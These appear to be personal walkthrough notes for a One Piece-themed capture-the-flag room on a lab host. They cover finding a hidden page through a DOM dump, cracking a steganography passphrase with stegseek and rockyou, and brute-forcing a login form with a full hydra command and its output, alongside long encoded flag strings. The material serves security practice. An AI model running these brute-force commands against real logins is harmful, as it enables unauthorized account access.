BNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJA
You succeed to run away but you don't own a Log Pose to go to Kaido's Island, you are sailing without even knowing where you are heading to.
You end up reaching a strange island: /r4nd0m.html

http://10.10.220.152/r4nd0m.html

 On your way, you decide to stop by an island you can see from your boat in order to get supplies.
Surprisingly enough, you meet your friend Buggy the Clown there.
He wants to challenge you to play one of his games. He knows he can't lose, he even promise a Log Pose for Onigashima if you can beat him.
He even let you decide which game you'd like to play: 

view-source:http://10.10.220.152/buggy_games/brain_teaser.js

document.getElementById('back').textContent = "Log Pose: /0n1g4sh1m4.php"  

document.getElementById('back')
<div id="back" class="cube_face">
​
accessKey: ""
​
accessKeyLabel: ""
​
align: ""
​
assignedSlot: null
​
attributes: NamedNodeMap [ id="back", class="cube_face" ]
​
baseURI: "http://10.10.220.152/buggy_games/brain_teaser.html"
​
childElementCount: 0
​
childNodes: NodeList [ #text
 ]
​
children: HTMLCollection { length: 0 }
​
classList: DOMTokenList [ "cube_face" ]
​
className: "cube_face"
​
clientHeight: 200
​
clientLeft: 3
​
clientTop: 3
​
clientWidth: 200
​
contentEditable: "inherit"
​
dataset: DOMStringMap(0)
​
dir: ""
​
draggable: false
​
enterKeyHint: ""
​
firstChild: #text "Log Pose: /0n1g4sh1m4.php"
​
firstElementChild: null
​
hidden: false
​
id: "back"
​
innerHTML: "Log Pose: /0n1g4sh1m4.php"
​
innerText: "Log Pose: /0n1g4sh1m4.php"
​
inputMode: ""
​
isConnected: true
​
isContentEditable: false
​
lang: ""
​
lastChild: #text "Log Pose: /0n1g4sh1m4.php"
​​
assignedSlot: null
​​
baseURI: "http://10.10.220.152/buggy_games/brain_teaser.html"
​​
childNodes: NodeList []
​​
data: "Log Pose: /0n1g4sh1m4.php"
​​
firstChild: null
​​
isConnected: true
​​
lastChild: null
​​
length: 25
​​
nextElementSibling: null
​​
nextSibling: null
​​
nodeName: "#text"
​​
nodeType: 3
​​
nodeValue: "Log Pose: /0n1g4sh1m4.php"
​​
ownerDocument: HTMLDocument http://10.10.220.152/buggy_games/brain_teaser.html
​​
parentElement: <div id="back" class="cube_face">​​
parentNode: <div id="back" class="cube_face">
​​
previousElementSibling: null
​​
previousSibling: null
​​
textContent: "Log Pose: /0n1g4sh1m4.php"
​​
wholeText: "Log Pose: /0n1g4sh1m4.php"
​​
<prototype>: TextPrototype { splitText: splitText(), wholeText: Getter, assignedSlot: Getter, … }
​
lastElementChild: null
​
localName: "div"
​
namespaceURI: "http://www.w3.org/1999/xhtml"
​
nextElementSibling: <div id="right" class="cube_face">​
nextSibling: #text "\n                "
​
nodeName: "DIV"
​
nodeType: 1
​
nodeValue: null
​
nonce: ""
​
offsetHeight: 205
​
offsetLeft: -103
​
offsetParent: <div id="container__animation" style="transform: rotateX(16.42…) rotateY(-26.5711deg);">
​
offsetTop: -8
​
offsetWidth: 205
​
onabort: null
​
onanimationcancel: null
​
onanimationend: null
​
onanimationiteration: null
​
onanimationstart: null
​
onauxclick: null
​
onbeforeinput: null
​
onblur: null
​
oncanplay: null
​
oncanplaythrough: null
​
onchange: null
​
onclick: null
​
onclose: null
​
oncontextmenu: null
​
oncopy: null
​
oncuechange: null
​
oncut: null
​
ondblclick: null
​
ondrag: null
​
ondragend: null
​
ondragenter: null
​
ondragexit: null
​
ondragleave: null
​
ondragover: null
​
ondragstart: null
​
ondrop: null
​
ondurationchange: null
​
onemptied: null
​
onended: null
​
onerror: null
​
onfocus: null
​
onformdata: null
​
onfullscreenchange: null
​
onfullscreenerror: null
​
ongotpointercapture: null
​
oninput: null
​
oninvalid: null
​
onkeydown: null
​
onkeypress: null
​
onkeyup: null
​
onload: null
​
onloadeddata: null
​
onloadedmetadata: null
​
onloadend: null
​
onloadstart: null
​
onlostpointercapture: null
​
onmousedown: null
​
onmouseenter: null
​
onmouseleave: null
​
onmousemove: null
​
onmouseout: null
​
onmouseover: null
​
onmouseup: null
​
onmozfullscreenchange: null
​
onmozfullscreenerror: null
​
onpaste: null
​
onpause: null
​
onplay: null
​
onplaying: null
​
onpointercancel: null
​
onpointerdown: null
​
onpointerenter: null
​
onpointerleave: null
​
onpointermove: null
​
onpointerout: null
​
onpointerover: null
​
onpointerup: null
​
onprogress: null
​
onratechange: null
​
onreset: null
​
onresize: null
​
onscroll: null
​
onsecuritypolicyviolation: null
​
onseeked: null
​
onseeking: null
​
onselect: null
​
onselectionchange: null
​
onselectstart: null
​
onslotchange: null
​
onstalled: null
​
onsubmit: null
​
onsuspend: null
​
ontimeupdate: null
​
ontoggle: null
​
ontransitioncancel: null
​
ontransitionend: null
​
ontransitionrun: null
​
ontransitionstart: null
​
onvolumechange: null
​
onwaiting: null
​
onwebkitanimationend: null
​
onwebkitanimationiteration: null
​
onwebkitanimationstart: null
​
onwebkittransitionend: null
​
onwheel: null
​
outerHTML: "<div id=\"back\" class=\"cube_face\">Log Pose: /0n1g4sh1m4.php</div>"
​
outerText: "Log Pose: /0n1g4sh1m4.php"
​
ownerDocument: HTMLDocument http://10.10.220.152/buggy_games/brain_teaser.html
​
parentElement: <div id="container__animation" style="transform: rotateX(16.42…) rotateY(-26.5711deg);">​
parentNode: <div id="container__animation" style="transform: rotateX(16.42…) rotateY(-26.5711deg);">​
part: DOMTokenList []
​
prefix: null
​
previousElementSibling: <div id="front" class="cube_face">​
previousSibling: #text "\n                "
​
scrollHeight: 200
​
scrollLeft: 0
​
scrollLeftMax: 0
​
scrollTop: 0
​
scrollTopMax: 0
​
scrollWidth: 200
​
shadowRoot: null
​
slot: ""
​
spellcheck: false
​
style: CSS2Properties(0)
​
tabIndex: -1
​
tagName: "DIV"
​
textContent: "Log Pose: /0n1g4sh1m4.php"
​
title: ""
​
<prototype>: HTMLDivElementPrototype { align: Getter & Setter, … }


http://10.10.220.152/0n1g4sh1m4.php

You reach the island of Onigashima. This is one of the Kaido's territory, one of the four Emperors, Kaido of the Beasts is renowned as the Strongest Creature in the world.
It is said that if it is a 1 vs 1, Kaido will prevail.
Speaking about brute force, Kaido is unbeatable.

Straw Hat Luffy has 2 options: 

download kaido.jpeg

┌──(witty㉿kali)-[~]
└─$ stegcracker kaido.jpeg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2023 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'kaido.jpeg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: imabeast
Tried 106308 passwords
Your file has been written to: kaido.jpeg.out
imabeast

15 min

or

https://github.com/RickdeJager/stegseek

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt install ./stegseek_0.6-1.deb

┌──(witty㉿kali)-[~]
└─$ stegseek kaido.jpeg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "imabeast"       

[i] Original filename: "kaido_login.txt".
[i] Extracting to "kaido.jpeg.out".
the file "kaido.jpeg.out" does already exist. overwrite ? (y/n) 

1 second :)

┌──(witty㉿kali)-[~]
└─$ cat kaido.jpeg.out 
Username:K1ng_0f_th3_B3@sts

using burpintruder

user=K1ng_0f_th3_B3%40sts&password=§admin§&submit_creds=Login

takes time to loads rockyou

or using hydra

┌──(witty㉿kali)-[~]
└─$ hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt 10.10.220.152 http-post-form "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR" -t 64 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-07 19:05:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.220.152:80/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR
[STATUS] 3755.00 tries/min, 3755 tries in 00:01h, 14340644 to do in 63:40h, 64 active
[STATUS] 3822.33 tries/min, 11467 tries in 00:03h, 14332932 to do in 62:30h, 64 active
[80][http-post-form] host: 10.10.220.152   login: K1ng_0f_th3_B3@sts   password: thebeast
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-07 19:10:51

You successfully stole a copy of the 3rd Road Poneglyph: FYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNBIWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LIKFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIK
You succeed to run away and there is only one Road Poneglyph left to find to be able to reach Laugh Tale. Unfortunately, the location of this last Poneglyph is unspecified.

http://10.10.220.152/unspecified

The last Road Poneglyphe: FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LIKFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LIKFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LI=


and finally will be

